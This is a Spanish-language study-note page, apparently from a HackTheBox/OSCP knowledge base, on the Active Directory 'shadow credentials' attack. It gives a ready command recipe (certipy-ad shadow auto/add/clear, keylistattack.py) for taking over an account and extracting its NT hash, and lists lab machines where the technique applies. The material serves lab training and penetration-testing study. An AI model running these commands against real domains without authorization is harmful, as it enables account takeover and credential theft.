# Técnica: shadow credentials

[[00-inicio|Inicio]] · [[Entorno|Entorno]] · [[Puertos|Puertos]] · [[Servicios|Servicios]] · [[Tecnicas|Tecnicas]] · [[Maquinas|Maquinas]] · [[Referencias|Referencias]]

**12 máquina(s)** mencionan esta técnica.

Alias buscados: `msds-keycredentiallink`, `key credential`

> Esta técnica tiene **recetario de comandos**. Está más abajo, después de la lista de máquinas.

## Comandos

> **Placeholders**: `<DC_IP>` · `<DOMINIO>` · `<USER>`/`<PASS>` · `<OBJETIVO>` (cuenta a tomar)

### Por qué es la vía limpia

Escribís un certificado en el atributo `msDS-KeyCredentialLink` del objetivo y
autenticás con él. **No cambia la contraseña del objetivo**, no rompe nada, y
se puede revertir.

Requisitos: `GenericWrite`, `GenericAll`, o `AddKeyCredentialLink` sobre el
objetivo. **Requiere ADCS** (una CA en el dominio).

### Preguntar si hay ADCS primero

```bash
certipy-ad find -u '<USER>@<DOMINIO>' -p '<PASS>' -dc-ip <DC_IP> -stdout
```

Si no hay CA, este ataque no funciona. Pasá a [[rbcd]] o a búsqueda de
credenciales.

### Automático (agrega, autentica, saca el hash y limpia)

```bash
certipy-ad shadow auto -u '<USER>@<DOMINIO>' -p '<PASS>' \
                       -account '<OBJETIVO>' -dc-ip <DC_IP>
```

Te devuelve el **hash NT** del objetivo. Con eso: [[pass-the-hash]].

### Manual, paso a paso

```bash
# Ver si ya hay credenciales de clave colgadas (de una prueba anterior)
certipy-ad shadow list -u '<USER>@<DOMINIO>' -p '<PASS>' -account '<OBJETIVO>' -dc-ip <DC_IP>

# Agregar
certipy-ad shadow add -u '<USER>@<DOMINIO>' -p '<PASS>' -account '<OBJETIVO>' -dc-ip <DC_IP>

# LIMPIAR al terminar — dejá el entorno como lo encontraste
certipy-ad shadow remove -u '<USER>@<DOMINIO>' -p '<PASS>' -account '<OBJETIVO>' -dc-ip <DC_IP>
certipy-ad shadow clear  -u '<USER>@<DOMINIO>' -p '<PASS>' -account '<OBJETIVO>' -dc-ip <DC_IP>
```

### Alternativa sin Certipy: keylistattack

```bash
keylistattack.py -k no -t <DC_IP> -u '<USER>' -p '<PASS>' -account '<OBJETIVO>' LIST
keylistattack.py -k no -t <DC_IP> -u '<USER>' -p '<PASS>' -account '<OBJETIVO>' FULL
```

### Errores típicos

| Error | Causa |
|---|---|
| `Could not find the CA` | No hay ADCS → el ataque no aplica |
| `insufficient access rights` | No tenés `GenericWrite` sobre el objetivo |
| `The object already has key credentials` | Hay algo colgado: usá `shadow clear` y reintentá |
| Falla la autenticación posterior | Probá `certipy-ad auth -pfx <archivo>.pfx -dc-ip <DC_IP>` |

> **Acordate de limpiar.** Dejar credenciales de clave en el objeto es modificar
> el entorno sin necesidad.

## Referencias

- [[WADComs|WADComs (espejo local)]] — https://wadcoms.github.io/
- [The Hacker Recipes](https://www.thehacker.recipes/)

---

## Máquinas

- [[htb-certified\|Certified]] — 17 mención(es) · Windows · Medium
- [[htb-haze\|Haze]] — 14 mención(es) · Windows · Hard
- [[htb-escapetwo\|EscapeTwo]] — 13 mención(es) · Windows · Easy
- [[htb-mist\|Mist]] — 13 mención(es) · Windows · Insane
- [[htb-absolute\|Absolute]] — 10 mención(es) · Windows · Insane
- [[htb-outdated\|Outdated]] — 10 mención(es) · Windows · Medium
- [[htb-darkcorp\|DarkCorp]] — 8 mención(es) · Windows · Insane
- [[htb-fluffy\|Fluffy]] — 8 mención(es) · Windows · Easy
- [[htb-infiltrator\|Infiltrator]] — 8 mención(es) · Windows · Insane
- [[htb-rebound\|Rebound]] — 8 mención(es) · Windows · Insane
- [[htb-tombwatcher\|TombWatcher]] — 8 mención(es) · Windows · Medium
- [[htb-logging\|Logging]] — 1 mención(es) · Windows · Medium

## Cómo ver el contexto

```bash
python3 _sistema/herramientas/buscar.py 'shadow credentials' -v
python3 _sistema/herramientas/buscar.py 'shadow credentials' -v --oscp
```
